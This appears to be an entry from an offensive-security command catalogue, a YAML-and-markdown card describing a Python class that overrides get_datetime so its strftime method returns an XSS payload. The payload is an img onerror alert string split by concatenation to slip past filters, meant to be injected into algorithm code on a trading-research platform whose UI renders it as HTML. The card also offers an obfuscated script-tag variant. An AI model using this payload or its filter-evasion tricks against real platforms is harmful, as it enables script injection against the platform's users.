---
id: cmd-uuid-002
data: |-
  class get_datetime():
      def __init__(self):
          self.img ='<img src=x'+' one'+'rror=alert(1)>'
      def strftime(self, x=None):
          return self.img
tags:
  - python
  - xss
type: command
output: >-
  When called as get_datetime().strftime(...), returns '<img src=x
  onerror=alert(1)>'
executor: python
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:23.601Z'
verified: false
validated: true
submitted: true
---
# define-malicious-get-datetime-class

## Command

```python
class get_datetime():
    def __init__(self):
        self.img ='<img src=x'+' one'+'rror=alert(1)>'
    def strftime(self, x=None):
        return self.img
```

## Description

Python class definition that overrides the get_datetime function to return an XSS payload via strftime, used in algorithm code for injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| __init__ | Initializes the payload string with concatenation to bypass filters | Yes |
| strftime | Returns the payload when called by the watched expression | Yes |

## Examples

### Basic Usage

Insert into algorithm code and evaluate get_datetime().strftime("%Y-%m-%d %H:%M:%S").__QUANTOPIAN__.

### Advanced Usage

Obfuscate further: self.img = '<scr' + 'ipt>alert(1)</scr' + 'ipt>' for script tags.

## Expected Output

The method returns the concatenated XSS string, rendered as HTML in the UI to execute JS.

## Related

- [[procedures/Override-get-datetime-with-Malicious-Class]]
